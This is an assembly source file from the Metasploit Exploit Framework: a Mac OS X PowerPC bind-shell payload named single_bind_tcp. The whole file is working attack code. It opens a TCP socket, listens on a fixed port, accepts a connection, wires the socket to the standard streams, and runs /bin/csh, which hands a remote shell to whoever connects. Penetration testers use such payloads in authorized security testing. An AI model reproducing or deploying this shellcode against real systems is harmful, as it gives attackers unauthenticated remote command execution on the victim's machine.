;;
;
;        Name: single_bind_tcp
;   Qualities: Can Have Nulls
;   Platforms: MacOS X / PPC
;     Authors: H D Moore <hdm [at] metasploit.com>
;     Version: $Revision: 1612 $
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Quick and dirty bind shell
;
;
;;


.globl _main
.globl _execsh
.text

_main:

_socket:
	li		r3, 2
	li		r4, 1
	li		r5, 6
	li		r0, 97
	sc
	xor		r0, r0, r0
	mr		r30, r3

	bl		_bind
	.long 0x00022312
	.long 0x00000000

_bind:	
	mflr	r4
	li		r5, 16
	li		r0, 104
	mr		r3, r30
	sc
	xor		r0, r0, r0

_listen:
	li		r0, 106
	mr		r3, r30
	sc
	xor     r0, r0, r0

_accept:
	mr		r3, r30
	li		r0, 30
	li		r4, 16
	stw		r4, -24(r1)
	subi	r5, r1, 24
	subi	r4, r1, 16
	sc
	xor		r0, r0, r0
	mr		r30, r3

_setup_dup2:
	li		r5, 2

_dup2:
	li		r0, 90
	mr		r3, r30
	mr		r4, r5
	sc
	xor		r0, r0, r0
	subi	r5, r5, 1
	cmpwi	r5, -1
	bnel	_dup2

_fork:
	li		r0, 2
	sc
	xor		r5, r5, r5

_execsh:
	;; based on ghandi's execve
	xor.	r5, r5, r5
	bnel	_execsh
	mflr	r3
	addi	r3, r3, 28	; distance to path
	stw		r3, -8(r1)	; argv[0] = path
	stw		r5, -4(r1)	; argv[1] = NULL
	subi	r4, r1, 8	; r4 = {path, 0}
	li		r0, 59
	sc					; execve(path, argv, NULL)
	
; csh removes the need for setuid()
path:
	.ascii	"/bin/csh"
	.long 	0x00414243
